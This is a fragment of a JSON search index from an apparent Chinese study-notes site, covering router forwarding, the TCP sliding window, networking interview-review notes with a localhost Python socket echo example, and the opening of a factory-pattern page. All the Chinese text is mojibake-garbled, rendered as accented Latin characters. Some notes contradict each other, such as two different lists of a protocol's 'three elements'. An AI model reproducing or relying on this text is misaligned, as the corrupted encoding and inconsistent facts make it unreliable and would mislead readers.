åœ°å€ï¼Œå³è·¯ç”±å™¨ R1 çš„ Fa0/0 æ¥å£ã€‚    è·¯ç”±å™¨è½¬å‘ #  R1 ä» PC 1 æ¥æ”¶åˆ°ä»¥å¤ªç½‘å¸§åæ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š\n  R1 æ£€æŸ¥ç›®çš„ MAC åœ°å€ï¼Œä¸æ¥æ”¶ç«¯å£ FastEthernet 0/0 ç›¸åŒ¹é…ï¼Œå› æ­¤ï¼Œå°†å¸§å¤åˆ¶åˆ° bufferã€‚\n  R1 è¯†åˆ«ä»¥å¤ªç½‘ç±»å‹ä¸º 0x800ï¼Œæ„å‘³ç€ä»¥å¤ªç½‘å¸§çš„æ•°æ®éƒ¨åˆ†åŒ…å« IPv4 æŠ¥æ–‡ã€‚\n  R1 è§£å°è£…è¯¥ä»¥å¤ªç½‘å¸§ã€‚\n  ç”±äºç›®çš„ IPv4 åœ°å€ä¸ R1 ç›´è¿çš„ä»»ä½•ç½‘ç»œéƒ½ä¸ç›¸ç¬¦ï¼ŒR1 åœ¨è·¯ç”±è¡¨ä¸­æŸ¥æ‰¾åŒ…å«è¯¥ç›®çš„ IPv4 åœ°å€ä¸»æœºçš„ç½‘ç»œåœ°å€ã€‚\n  "},{"id":400,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/8.tcp%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/","title":"8. Tcpæ»‘åŠ¨çª—å£","section":"ç½‘ç»œåŸºæœ¬åŠŸ","content":" å­¦ä¹ ç½‘å€ï¼š\n https://www.kancloud.cn/wizardforcel/network-basic/135490   TCP æ»‘åŠ¨çª—å£ #  ä»‹ç» #  å°† TCP ä¸ UDP è¿™æ ·çš„ç®€å•ä¼ è¾“åè®®åŒºåˆ†å¼€æ¥çš„æ ¹æ®æ˜¯å®ƒä»¬ä¼ è¾“æ•°æ®çš„è´¨é‡ã€‚ä¸»è¦è€ƒè™‘çš„æ˜¯ä»¥ä¸‹ä¸¤ä¸ªå…³é”®åŠŸèƒ½ï¼š\n å¯é æ€§ï¼šä¿è¯æ•°æ®ç¡®å®åˆ°è¾¾ç›®çš„åœ°ã€‚å¦‚æœæœªåˆ°è¾¾ï¼Œèƒ½å¤Ÿå‘ç°å¹¶é‡ä¼ ã€‚ æ•°æ®æµæ§ï¼šç®¡ç†æ•°æ®çš„å‘é€é€Ÿç‡ï¼Œä»¥ä½¿æ¥æ”¶è®¾å¤‡ä¸è‡´äºè¿‡è½½ã€‚  è¦å®Œæˆè¿™äº›ä»»åŠ¡ï¼Œæ•´ä¸ªåè®®æ“ä½œæ˜¯å›´ç»•æ»‘åŠ¨çª—å£ç¡®è®¤æœºåˆ¶æ¥è¿›è¡Œçš„ã€‚å› æ­¤ï¼Œç†è§£äº†æ»‘åŠ¨çª—å£ï¼Œä¹Ÿå°±æ˜¯ç†è§£äº†TCPã€‚\né¢å‘æµçš„æ»‘åŠ¨çª—å£ç¡®è®¤æœºåˆ¶ #  TCPå°†ç‹¬ç«‹çš„å­—èŠ‚æ•°æ®å½“ä½œæµæ¥å¤„ç†ã€‚ä¸€æ¬¡å‘é€ä¸€ä¸ªå­—èŠ‚å¹¶æ¥æ”¶ä¸€æ¬¡ç¡®è®¤æ˜¾ç„¶æ˜¯ä¸å¯è¡Œçš„ã€‚å³ä½¿é‡å ä¼ è¾“ï¼ˆå³ä¸ç­‰å¾…ç¡®è®¤å°±å‘é€ä¸‹ä¸€ä¸ªæ•°æ®ï¼‰ï¼Œé€Ÿåº¦ä¹Ÿè¿˜æ˜¯ä¼šéå¸¸ç¼“æ…¢ã€‚\nTCP æ¶ˆæ¯ç¡®è®¤æœºåˆ¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé¦–å…ˆï¼Œæ¯ä¸€æ¡æ¶ˆæ¯éƒ½æœ‰ä¸€ä¸ªè¯†åˆ«ç¼–å·ï¼Œæ¯ä¸€æ¡æ¶ˆæ¯éƒ½èƒ½å¤Ÿè¢«ç‹¬ç«‹åœ°ç¡®è®¤ï¼Œå› æ­¤åŒä¸€æ—¶åˆ»å¯ä»¥å‘é€å¤šæ¡ä¿¡æ¯ã€‚è®¾å¤‡ B å®šæœŸå‘é€ç»™ A ä¸€æ¡å‘é€é™åˆ¶å‚æ•°ï¼Œåˆ¶çº¦è®¾å¤‡ A ä¸€æ¬¡èƒ½å‘é€çš„æ¶ˆæ¯æœ€å¤§æ•°é‡ã€‚è®¾å¤‡ B å¯ä»¥å¯¹è¯¥å‚æ•°è¿›è¡Œè°ƒæ•´ï¼Œä»¥æ§åˆ¶è®¾å¤‡ A çš„æ•°æ®æµã€‚\nä¸ºäº†æé«˜é€Ÿåº¦ï¼ŒTCP å¹¶æ²¡æœ‰æŒ‰ç…§å­—èŠ‚å•ä¸ªå‘é€è€Œæ˜¯å°†æ•°æ®æµåˆ’åˆ†ä¸ºç‰‡æ®µã€‚ç‰‡æ®µå†…æ‰€æœ‰å­—èŠ‚éƒ½æ˜¯ä¸€èµ·å‘é€å’Œæ¥æ”¶çš„ï¼Œå› æ­¤ä¹Ÿæ˜¯ä¸€èµ·ç¡®è®¤çš„ã€‚ç¡®è®¤æœºåˆ¶æ²¡æœ‰é‡‡ç”¨ message ID å­—æ®µï¼Œè€Œæ˜¯ä½¿ç”¨çš„ç‰‡æ®µå†…æœ€åä¸€ä¸ªå­—èŠ‚çš„ sequence numberã€‚å› æ­¤ä¸€æ¬¡å¯ä»¥å¤„ç†ä¸åŒçš„å­—èŠ‚æ•°ï¼Œè¿™ä¸€æ•°é‡å³ä¸ºç‰‡æ®µå†…çš„ sequence numberã€‚\nå‘é€æ–¹å’Œæ¥æ”¶æ–¹å¿…é¡»å°±å®ƒä»¬å°†è¦ä¸ºæ•°æ®æµä¸­çš„å­—èŠ‚æŒ‡å®šçš„ sequence number è¾¾æˆä¸€è‡´ã€‚è¿™ä¸€è¿‡ç¨‹ç§°ä¸ºåŒæ­¥ï¼Œåœ¨TCPè¿æ¥å»ºç«‹æ—¶å®Œæˆã€‚\næˆ‘ä»¬å¯ä»¥å°† TCP buffer ä¸­çš„æ•°æ®åˆ†ä¸ºä»¥ä¸‹çš„å››ç±»ï¼Œå¹¶æŠŠä»–ä»¬çœ‹ä½œä¸€ä¸ªæ—¶é—´è½´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n å·²å‘é€å·²ç¡®è®¤ï¼šæ•°æ®æµä¸­æœ€æ—©çš„å­—èŠ‚å·²ç»å‘é€å¹¶å¾—åˆ°ç¡®è®¤ã€‚è¿™äº›æ•°æ®æ˜¯ç«™åœ¨å‘é€è®¾å¤‡çš„è§’åº¦æ¥çœ‹çš„ã€‚ å·²å‘é€ä½†å°šæœªç¡®è®¤ï¼šå·²å‘é€ä½†å°šæœªå¾—åˆ°ç¡®è®¤çš„å­—èŠ‚ã€‚å‘é€æ–¹åœ¨ç¡®è®¤ä¹‹å‰ï¼Œä¸è®¤ä¸ºè¿™äº›æ•°æ®å·²ç»è¢«å¤„ç†ã€‚ æœªå‘é€è€Œæ¥æ”¶æ–¹å·²Readyï¼šè®¾å¤‡å°šæœªå°†æ•°æ®å‘å‡ºï¼Œä½†æ¥æ”¶æ–¹æ ¹æ®æœ€è¿‘ä¸€æ¬¡å…³äºå‘é€æ–¹ä¸€æ¬¡è¦å‘é€å¤šå°‘å­—èŠ‚ç¡®è®¤è‡ªå·±æœ‰è¶³å¤Ÿç©ºé—´ã€‚å‘é€æ–¹ä¼šç«‹å³å°è¯•å‘é€ã€‚ æœªå‘é€è€Œæ¥æ”¶æ–¹Not Readyï¼šç”±äºæ¥æ”¶æ–¹ not readyï¼Œè¿˜ä¸å…è®¸å°†è¿™éƒ¨åˆ†æ•°æ®å‘å‡ºã€‚  å®é™…ä¸Šï¼Œæ”¶å‘åŒæ–¹å„è‡ªç»´æŠ¤ä¸€å¥—ç‹¬ç«‹çš„å˜é‡ï¼Œæ¥ç›‘æ§å‘é€å’Œæ¥æ”¶çš„æ•°æ®æµè½åœ¨å“ªä¸€ç±»ã€‚\nå‘é€çª—å£ä¸å¯ç”¨çª—å£ #  æ¦‚å¿µ #  æ•´ä¸ªè¿‡ç¨‹å…³é”®çš„æ“ä½œåœ¨äºæ¥æ”¶æ–¹å…è®¸å‘é€æ–¹ä¸€æ¬¡èƒ½å®¹çº³çš„æœªç¡®è®¤çš„å­—èŠ‚æ•°ã€‚è¿™ç§°ä¸ºå‘é€çª—å£ï¼Œæœ‰æ—¶ä¹Ÿç§°ä¸ºçª—å£ã€‚è¯¥çª—å£å†³å®šäº†å‘é€æ–¹å…è®¸ä¼ é€çš„å­—èŠ‚æ•°ï¼Œä¹Ÿæ˜¯ 2 ç±»å’Œ 3 ç±»çš„å­—èŠ‚æ•°ä¹‹å’Œã€‚\n$$å‘é€çª—å£ \\cong çª—å£, size(çª—å£) = (å·²å‘é€ä½†å°šæœªç¡®è®¤å­—èŠ‚ + æœªå‘é€è€Œæ¥æ”¶æ–¹å·² Ready å­—èŠ‚)$$\næœ€åä¸¤ç±»ï¼ˆæ¥æ”¶æ–¹å‡†å¤‡å¥½è€Œå°šæœªå‘é€ï¼Œæ¥æ”¶æ–¹æœªå‡†å¤‡å¥½ï¼‰çš„åˆ†ç•Œçº¿åœ¨äºæ·»åŠ äº†ä»ç¬¬ä¸€ä¸ªæœªç¡®è®¤å­—èŠ‚å¼€å§‹çš„çª—å£ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nç¡®è®¤å¤„ç†ä»¥åŠçª—å£ç¼©æ”¾ #  è¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œç›®æ ‡è®¾å¤‡å‘å‘é€æ–¹ä¼ å›ç¡®è®¤ä¿¡æ¯ã€‚ç›®æ ‡è®¾å¤‡ä¸ä¼šç‰¹åˆ«åˆ—å‡ºå®ƒå·²ç»ç¡®è®¤çš„å­—èŠ‚ï¼Œå› ä¸ºè¿™ä¼šå¯¼è‡´æ•ˆç‡ä½ä¸‹ã€‚ç›®æ ‡è®¾å¤‡ä¼šå‘é€è‡ªä¸Šä¸€æ¬¡æˆåŠŸæ¥æ”¶åçš„æœ€é•¿å­—èŠ‚æ•°ã€‚\nå½“å‘é€è®¾å¤‡æ¥æ”¶åˆ°ç¡®è®¤ä¿¡æ¯ï¼Œåˆ™ä¼šå°†ä¸€éƒ¨åˆ†ç¬¬ 2 ç±»å­—èŠ‚è½¬ç§»åˆ°ç¬¬ 1 ç±»ï¼Œå› ä¸ºå®ƒä»¬å·²ç»å¾—åˆ°äº†ç¡®è®¤ã€‚å› ä¸ºçª—å£å¤§å°æ²¡æœ‰æ”¹å˜ï¼Œçª—å£å‘å³ç§»åŠ¨ç¡®è®¤æ¥æ”¶çš„é•¿åº¦ï¼Œéƒ¨åˆ†ç¬¬ 4 ç±»å­—èŠ‚ç§»åŠ¨è‡³ç¬¬ 3 ç±»ã€‚\nå¤„ç†ä¸¢å¤±çš„ä¿¡æ¯ #  TCP åŒ…æ‹¬ä¸€ä¸ªä¼ è¾“åŠé‡ä¼ çš„è®¡æ—¶æœºåˆ¶ã€‚TCP ä¼šé‡ä¼ ä¸¢å¤±çš„ç‰‡æ®µã€‚ä½†æœ‰ä¸€ä¸ªç¼ºé™·æ˜¯ï¼šå› ä¸ºå®ƒä¸ä¼šå¯¹æ¯ä¸€ä¸ªç‰‡æ®µåˆ†åˆ«è¿›è¡Œç¡®è®¤ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å…¶ä»–å®é™…ä¸Šå·²ç»æ¥æ”¶åˆ°çš„ç‰‡æ®µè¢«é‡ä¼ ï¼ˆæ¯”å¦‚ 42 è‡³ 45ï¼‰ã€‚\n"},{"id":401,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0/","title":"é¢è¯•å¤ä¹ ","section":"è®¡ç®—æœºç½‘ç»œ","content":" é€šè¿‡è¥¿ç”µçš„åœ¨çº¿ MOOC å­¦ä¹ ç½‘ç»œå®‰å…¨ï¼š\n https://www.icourse163.org/learn/UESTC-235006?tid=272013#/learn/content?type=detail\u0026id=1004490139\u0026sm=1   è®¡ç®—æœºç½‘ç»œ #  ä¸‰ç§å·¥ä½œæ–¹å¼ï¼š\n å•å·¥ï¼šæ•°æ®åªèƒ½åœ¨ä¸€ä¸ªæ–¹å‘ä¸Šä¼ è¾“\nåŠåŒå·¥ï¼šæ•°æ®å¯ä»¥åœ¨ä¸¤ä¸ªæ–¹å‘ä¸Šä¼ è¾“ï¼Œä½†æ˜¯ä¸€æ¬¡åªå…è®¸æ•°æ®åœ¨ä¸€ä¸ªæ–¹å‘ä¼ è¾“\nå…¨åŒå·¥ï¼šå…è®¸æ•°æ®åŒæ—¶åœ¨ä¸¤ä¸ªæ–¹å‘ä¸Šä¼ è¾“\n IPv4 ä¸‰ç±»åœ°å€ï¼š\n è§ï¼šhttps://tools.ietf.org/html/rfc3330\nAç±»åœ°å€ 1.0.0.1-126.255.255.254ï¼Œç¬¬ä¸€æ®µç¬¬ä¸€ä½äºŒè¿›åˆ¶ä½ä»¥ 0 å¼€å¤´ï¼Œæœ€åä¸‰æ®µè¡¨ç¤ºä¸»æœºåœ°å€ï¼›\nBç±»åœ°å€ 128.1.0.1-191.255.255.254ï¼Œç¬¬ä¸€æ®µå‰ä¸¤ä½äºŒè¿›åˆ¶ä½ä¸º 10 å¼€å¤´ï¼Œæœ€åä¸¤æ®µè¡¨ç¤ºä¸»æœºåœ°å€ï¼›\nCç±»åœ°å€ 192.0.1.1-223.255.255.254ï¼Œç¬¬ä¸€æ®µå‰ä¸‰ä½äºŒè¿›åˆ¶ä½ä¸º 110 å¼€å¤´ï¼Œæœ€åä¸€æ®µè¡¨ç¤ºä¸»æœºåœ°å€ï¼›\nD ç±»åœ°å€ï¼ˆç¾¤æ’­åœ°å€ï¼‰ ,ç¬¬ä¸€æ®µå‰å››ä½ä¸º 1110 å¼€å¤´ã€‚\n IP åè®®ä¸­çš„ç”Ÿå­˜æ—¶é—´ï¼š\n ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼Œtime-to-liveï¼‰æ˜¯Internetåè®®ï¼ˆIPï¼‰åŒ…ä¸­çš„ä¸€ä¸ªå€¼ï¼Œå®ƒå‘ŠçŸ¥è·¯ç”±å™¨è¯¥åŒ…æ˜¯å¦åœ¨ç½‘ç»œä¸­æ—¶é—´è¿‡é•¿è€Œåº”è¯¥è¢«ä¸¢å¼ƒã€‚\n åŒç»çº¿çš„åŒç»åŸå› ï¼š\n ç»åˆå¯ä»¥å‡å°‘å¯¹ç›¸é‚»å¯¼çº¿çš„ç”µç£å¹²æ‰°ã€‚\n å…³äº 10BASE-Tï¼š\n 10 ä»£è¡¨æ•°æ®ä¼ è¾“ç‡ï¼ŒBASE åŸºå¸¦ä¼ è¾“ï¼ŒT ä»£è¡¨åŒç»çº¿ã€‚F ä¸ºå…‰çº¤\n ç½‘ç»œå†²çªï¼š\n IEEE802.3 åè®®é‡‡ç”¨ CSMA/CD åè®®ï¼Œä¸€å®šä¼šå‘ç”Ÿå†²çªï¼›\n802.4 å’Œ 802.5 åˆ™ä¸ä¼šã€‚\n è·¯ç”±é€‰æ‹©åè®®ï¼š\n RIP åè®®ï¼šAS å†…éƒ¨çš„è·¯ç”±é€‰æ‹©åè®®ï¼Œé‡‡ç”¨è·ç¦»å‘é‡ç®—æ³•ï¼Œé™åˆ¶æœ€å¤§ä¸º 15 çš„è·³åº¦ï¼›\nOSPF åè®®ï¼šAS å†…éƒ¨çš„è·¯ç”±é€‰æ‹©åè®®ï¼Œé‡‡ç”¨ Dijkstra è·¯å¾„é€‰æ‹©ç®—æ³•ï¼›\nBGP åè®®ï¼šAS ä¹‹é—´çš„è·¯ç”±é€‰æ‹©åè®®ï¼ŒåŒæ ·ä½¿ç”¨è·ç¦»å‘é‡ç®—æ³•ï¼Œä½†æ˜¯ä¼ è¾“ä¿¡æ¯ä¸­åŒ…å«äº† AS-PATHï¼Œå› æ­¤ä¸ä¼šå‡ºç°ç¯è·¯é—®é¢˜ã€‚\n SOCKET ç¼–ç¨‹ï¼š\n æœåŠ¡ç«¯ä»£ç ï¼š\nfrom socket import *  HOST = \u0026#39;localhost\u0026#39; PORT = 21567 BUFFERSIZE = 1024 ADDR = (HOST, PORT)  tcpServerSocket = socket(AF_INET, SOCK_STREAM) tcpServerSocket.bind(ADDR) # ç»‘å®šåœ°å€ï¼ˆä¸»æœºåï¼Œç«¯å£å·ï¼‰ tcpServerSocket.listen(5) # å¼€å§‹ç›‘å¬TCP  while True:  print \u0026#39;waiting for connection...\u0026#39;  # è¢«åŠ¨æ¥å—TCPå®¢æˆ·ç«¯çš„è¯·æ±‚åˆ°æ¥ï¼Œé˜»å¡å¼  tcpClientSocket, addr = tcpServerSocket.accept()  print \u0026#39;connected from:\u0026#39; + str(addr)   while True:  data = tcpClientSocket.recv(BUFFERSIZE)  if not data:  break  # å‘é€TCPæ•°æ®  tcpClientSocket.send(\u0026#39;%s\u0026#39; % data)  tcpClientSocket.close() tcpServerSocket.close() å®¢æˆ·ç«¯ä»£ç ï¼š\nfrom socket import *  HOST = \u0026#39;localhost\u0026#39; PORT = 21567 BUFFERSIZE = 1024 ADDR = (HOST, PORT)  tcpClientSocket = socket(AF_INET, SOCK_STREAM) tcpClientSocket.connect(ADDR) # è¿æ¥åˆ°æœåŠ¡å™¨  while True:  data = raw_input(\u0026#39;\u0026gt;\u0026#39;)  if not data:  break  tcpClientSocket.send(data)  data = tcpClientSocket.recv(BUFFERSIZE)  if not data:  break  print data tcpClientSocket.close()  ç åˆ†å¤šå€é€šä¿¡ï¼ˆCDMAï¼‰ï¼š\n ç åˆ†å¤šå€( Code Division Multiple Accessï¼ŒCDMAï¼‰æ˜¯é€šè¿‡ç¼–ç åŒºåˆ†ä¸åŒç”¨æˆ·ä¿¡æ¯ï¼Œå®ç°ä¸åŒç”¨æˆ·åŒé¢‘ã€åŒæ—¶ä¼ è¾“çš„ä¸€ç§é€šä¿¡æŠ€æœ¯ã€‚\nhttps://blog.csdn.net/huanhuan_Coder/article/details/83012467\n è™šç”µè·¯ï¼š\n è™šç”µè·¯è¡¨ç¤ºè¿™åªæ˜¯ä¸€æ¡ é€»è¾‘ä¸Šçš„è¿æ¥ ï¼Œåˆ†ç»„éƒ½æ²¿ç€è¿™æ¡é€»è¾‘è¿æ¥æŒ‰ç…§å­˜å‚¨è½¬å‘æ–¹å¼ä¼ é€ï¼Œè€Œ å¹¶ä¸æ˜¯çœŸæ­£å»ºç«‹äº†ä¸€æ¡ç‰©ç†è¿æ¥ ã€‚åŒ…æ‹¬å»ºç«‹è¿æ¥ï¼Œä¼ è¾“æ•°æ®ï¼Œæ‹†é™¤è¿æ¥ä¸‰ä¸ªé˜¶æ®µã€‚å»ºç«‹è¿æ¥ä¹‹åå°±ç±»ä¼¼äºä¸“çº¿ï¼Œæ‰€ä»¥ä¸å­˜åœ¨è·¯ç”±é€‰æ‹©\n äº”å±‚æ•°æ®å°è£…çš„åç§°ï¼š\n  åº”ç”¨å±‚ï¼ŒMessageï¼ŒæŠ¥æ–‡ï¼› ä¼ è¾“å±‚ï¼ŒSegmentï¼ŒæŠ¥æ–‡æ®µï¼› ç½‘ç»œå±‚ï¼ŒDatagramï¼Œæ•°æ®æŠ¥ï¼› é“¾è·¯å±‚ï¼ŒFrameï¼Œå¸§ï¼› ç‰©ç†å±‚ï¼ŒBitsï¼Œæ¯”ç‰¹ã€‚   ä»¥å¤ªç½‘å¸§é•¿åº¦çš„é™åˆ¶ï¼š\n åœ¨ä¼ ç»Ÿä»¥å¤ªç½‘ä¸­,æœ‰æœ€å°å¸§é•¿åº¦å’Œæœ€å¤§å¸§é•¿åº¦çš„é™åˆ¶ã€‚\nä»¥å¤ªç½‘çš„å¸§é•¿åº¦æ€»æ˜¯åœ¨ä¸€å®šèŒƒå›´å†…æµ®åŠ¨ï¼Œä¸€èˆ¬æœ€å¤§çš„å¸§é•¿æ˜¯ 1518 å­—èŠ‚ï¼Œæœ€å°çš„å¸§é•¿æ˜¯ 64 å­—èŠ‚ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¸§çš„å¤§å°æ˜¯ç”±è®¾å¤‡çš„ MTUï¼ˆæœ€å¤§ä¼ è¾“å•ä½ï¼‰å³è®¾å¤‡æ¯æ¬¡èƒ½å¤Ÿä¼ è¾“çš„æœ€å¤§å­—èŠ‚æ•°è‡ªåŠ¨æ¥ç¡®å®šçš„ã€‚\n ç½‘ç»œåè®®çš„ä¸‰è¦ç´ ï¼š\n è¯­æ³• ç”¨æ¥è§„å®šä¿¡æ¯æ ¼å¼ï¼›æ•°æ®åŠæ§åˆ¶ä¿¡æ¯çš„æ ¼å¼ã€ç¼–ç åŠä¿¡å·ç”µå¹³ç­‰ã€‚\nè¯­ä¹‰ ç”¨æ¥è¯´æ˜é€šä¿¡åŒæ–¹åº”å½“æ€ä¹ˆåšï¼›ç”¨äºåè°ƒä¸å·®é”™å¤„ç†çš„æ§åˆ¶ä¿¡æ¯ã€‚\nå®šæ—¶ ï¼ˆæ—¶åºï¼‰å®šä¹‰äº†ä½•æ—¶è¿›è¡Œé€šä¿¡ï¼Œå…ˆè®²ä»€ä¹ˆï¼Œåè®²ä»€ä¹ˆï¼Œè®²è¯çš„é€Ÿåº¦ç­‰ã€‚æ¯”å¦‚æ˜¯é‡‡ç”¨åŒæ­¥ä¼ è¾“è¿˜æ˜¯å¼‚æ­¥ä¼ è¾“ï¼\n å¸¸è§å¹¿åŸŸç½‘ï¼š\n å‡ ç§å¸¸ç”¨çš„å¹¿åŸŸç½‘ï¼šå…¬ç”¨ç”µè¯äº¤æ¢ç½‘ï¼ˆPSTNï¼‰ã€åˆ†ç»„äº¤æ¢ç½‘ï¼ˆX.25ï¼‰ã€æ•°å­—æ•°æ®ç½‘ï¼ˆDDNï¼‰ã€å¸§ä¸­ç»§ï¼ˆFRï¼‰ã€äº¤æ¢å¼å¤šå…†ä½æ•°æ®æœåŠ¡ï¼ˆSMDSï¼‰å’Œå¼‚æ­¥ä¼ è¾“æ¨¡å¼ï¼ˆATMï¼‰ã€‚\n æ³¢ç‰¹ç‡ï¼š\n æ³¢ç‰¹ç‡ï¼Œå¯ä»¥é€šä¿—çš„ç†è§£ä¸ºä¸€ä¸ªè®¾å¤‡åœ¨ä¸€ç§’é’Ÿå†…å‘é€ï¼ˆæˆ–æ¥æ”¶ï¼‰äº†å¤šå°‘ç å…ƒçš„æ•°æ®ã€‚\n å±€åŸŸç½‘å¹¿æ’­åœ°å€ï¼š\n ä¸»æœºå·ä¸ºå…¨ 1ï¼Œè¡¨ç¤ºå¹¿æ’­åœ°å€\n TCP/UDP å¸¸è§ç«¯å£çš„æœåŠ¡ï¼š\n è§ï¼šhttp://tool.oschina.net/commons?type=7 ä¸ https://www.jianshu.com/p/048963e312bc\nå¸¸è§æ•°æ®åº“æ‰€åœ¨ç«¯å£ï¼š\n   mysql sqlserver server sqlserver monitor oracle postgre sql oracle emctl oracle xdb oracle xdb ftp     3306 1433 1434 1521 5432 1158 8080 2100     TCP/IP åè®®æ—ä»¥åŠå…¶å®‰å…¨éšæ‚£ #  ç½‘ç»œæŒ‰èŒƒå›´åˆ†ç±»ï¼šLANã€WANã€‚\nè®¡ç®—æœºåè®®çš„ä¸‰è¦ç´ ï¼šè¯­æ³•ã€è¯­ä¹‰å’Œåè®®ã€‚\nåè®®æ•°æ®å°è£…ï¼š\nFH---IH---TH---AH---DATA---FT ARP åè®® #  ARP åè®®çš„å®‰å…¨éšæ‚£ï¼Œä¸»è¦æœ‰ä¸‰ç±»ï¼šARP çªƒå¬ã€ARP æ¬ºéª—ï¼ˆARP æ±¡æŸ“ï¼Œé»‘æ´æ”»å‡»ï¼‰ã€GARP æ»¥ç”¨æ”»å‡»ã€‚\nARP åè®®å®‰å…¨éšæ‚£çš„é˜²å¾¡æŠ€æœ¯ï¼Œä¸»è¦æœ‰å››ç±»ï¼šé‡‡ç”¨é™æ€ç»‘å®šçš„æ–¹å¼é˜²æ­¢ ARP æ¬ºéª—ï¼ˆWindows \u0026amp; Linux éƒ½å¯ä»¥ä½¿ç”¨ arp å‘½ä»¤æ“ä½œå…¶æ˜ å°„è¡¨ï¼‰ã€é‡‡ç”¨ ARP ä»£ç†æœåŠ¡å™¨ã€åœ¨ç½‘ç»œè®¾å¤‡ä¸Šå¯¹ ARP æ¶ˆæ¯è¿›è¡Œæ£€æµ‹å’Œæ§åˆ¶ã€ç¦ç”¨ GARP åŠŸèƒ½ï¼ˆä¸»æœºå¯ä»¥é€‰æ‹©æ€§åœ°å¿½ç•¥ GARP æ¶ˆæ¯ï¼‰ã€‚\nIP åè®® #  IP åè®®çš„å®‰å…¨éšæ‚£ï¼Œä¸»è¦æœ‰ä¸‰ç±»ï¼šIP çªƒå¬ã€IP åœ°å€å‡å†’æ”»å‡»ã€IP ç¢ç‰‡æ”»å‡»ã€‚\nIP åè®®çš„å®‰å…¨é˜²å¾¡æ–¹æ³•ï¼šå…¥å£è¿‡æ»¤ã€å‡ºå£è¿‡æ»¤ã€IP æº¯æºã€‚\nTCP åè®® #  TCP åè®®çš„ç‰¹ç‚¹ï¼šå…¨åŒå·¥è¿æ¥ã€é¢å‘è¿æ¥ã€å¯é æ€§ã€é¢å‘å­—èŠ‚æµçš„åè®®ã€‚\nTCP åè®®çš„å®‰å…¨éšæ‚£ï¼šSYN æ³›æ´ªæ”»å‡»ã€ACK æ³›æ´ªæ”»å‡»ã€åºåˆ—å·é¢„æµ‹æ”»å‡»ã€LAND æ”»å‡»ï¼ˆä½¿æœåŠ¡å™¨å»ºç«‹è‡ªè¿æ¥ï¼‰ã€‚\nUDP åè®® #  UDP åè®®çš„ç‰¹ç‚¹ï¼šæ— è¿æ¥çš„åè®®ã€ä¸å¯é çš„åè®®ã€ä¸ä¿åºåè®®ã€‚\nUDP åè®®çš„å®‰å…¨éšæ‚£ï¼šå‡å†’ã€åŠ«æŒã€æ³›æ´ª\nHTTP åè®® #  HTTP åè®®çš„ç‰¹ç‚¹ï¼šæ˜¯ä¸€ä¸ªåŸºäºè¯·æ±‚ä¸å“åº”æ¨¡å¼çš„ã€æ— çŠ¶æ€çš„åº”ç”¨å±‚åè®®ï¼›å¸¸åŸºäº TCP çš„è¿æ¥æ–¹å¼ï¼›ç»å¤§å¤šæ•° WEB åº”ç”¨éƒ½æ˜¯æ„å»ºåœ¨ HTTP åè®®ä¹‹ä¸Šã€‚\nHTTP è¯·æ±‚æ¶ˆæ¯æ ¼å¼ç»„æˆï¼šè¯·æ±‚è¡Œã€æ¶ˆæ¯æŠ¥å¤´ã€è¯·æ±‚æ­£æ–‡ã€‚\nHTTP ç›¸åº”æ¶ˆæ¯æ ¼å¼ç»„æˆï¼šåˆå§‹çŠ¶æ€è¡Œã€é¦–éƒ¨è¡Œã€å®ä½“ä¸»ä½“ã€‚\nHTTP åè®®çš„å®‰å…¨éšæ‚£ï¼Œä¸»è¦æœ‰ä¸¤ç§æ”»å‡»ï¼šé’“é±¼æ”»å‡»å’Œè·¨ç«™è„šæœ¬æ”»å‡»ã€‚\néš”ç¦»æŠ€æœ¯ #  "},{"id":402,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/1.%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/","title":"1.å·¥å‚æ¨¡å¼","section":"1.åˆ›å»ºå‹æ¨¡å¼","content":"å·¥å‚æ¨¡å¼ #  ä»‹ç» #  æ„å›¾ï¼š\n å®šä¹‰ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè®©å…¶å­ç±»è‡ªå·±å†³å®šå®ä¾‹åŒ–å“ªä¸€ä¸ªå·¥å‚ç±»ï¼Œå·¥å‚æ¨¡å¼ä½¿å…¶åˆ›å»ºè¿‡ç¨‹å»¶è¿Ÿåˆ°å­ç±»è¿›è¡Œã€‚  åº”ç”¨å®ä¾‹ï¼š\n æ‚¨éœ€è¦ä¸€è¾†æ±½è½¦ï¼Œå¯ä»¥ç›´æ¥ä»å·¥å‚é‡Œé¢æè´§ï¼Œè€Œä¸ç”¨å»ç®¡è¿™è¾†æ±½è½¦æ˜¯æ€ä¹ˆåšå‡ºæ¥çš„ï¼Œä»¥åŠè¿™ä¸ªæ±½è½¦é‡Œé¢çš„å…·ä½“å®ç°ã€‚ Hibernate æ¢æ•°æ®åº“åªéœ€æ¢æ–¹è¨€å’Œé©±åŠ¨å°±å¯ä»¥ã€‚ æ—¥å¿—è®°å½•å™¨ï¼šè®°å½•å¯èƒ½è®°å½•åˆ°æœ¬åœ°ç¡¬ç›˜ã€ç³»ç»Ÿäº‹ä»¶ã€è¿œç¨‹æœåŠ¡å™¨ç­‰ï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹©è®°å½•æ—¥å¿—åˆ°ä»€ä¹ˆåœ°æ–¹ã€‚ 